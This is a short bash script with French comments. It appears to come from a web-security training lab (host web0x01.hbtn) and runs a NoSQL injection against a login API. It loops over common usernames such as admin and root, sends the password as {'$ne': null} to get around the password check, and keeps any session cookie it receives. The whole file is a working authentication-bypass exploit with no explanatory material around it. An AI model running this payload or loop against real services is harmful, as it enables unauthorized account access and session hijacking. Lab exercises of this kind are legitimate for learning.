#!/bin/bash

BASE="http://web0x01.hbtn"
LOGIN="$BASE/api/a3/nosql_injection/login"

COOKIE="cookies.txt"
rm -f "$COOKIE"

# Liste des users (tu peux en ajouter)
USERS=(
  "elonsumk"
  "admin"
  "root"
  "test"
  "user"
)

echo "[*] Looking for a valid authenticated session cookie..."

for USER in "${USERS[@]}"; do
  echo "[*] Trying user: $USER"

  rm -f "$COOKIE"

  # Login API (silencieux, mais pose un cookie si OK)
  curl -s -c "$COOKIE" -X POST "$LOGIN" \
    -H "Content-Type: application/json" \
    -d "{
      \"username\": \"$USER\",
      \"password\": { \"\$ne\": null }
    }" > /dev/null

  # Vérifie si un cookie session a été écrit
  if [ -f "$COOKIE" ] && grep -q "session" "$COOKIE"; then
    echo "✅ Cookie récupéré pour l'utilisateur: $USER"
    echo "📁 Cookie stocké dans cookies.txt"
    exit 0
  fi

done

echo "❌ Aucun cookie valide trouvé."

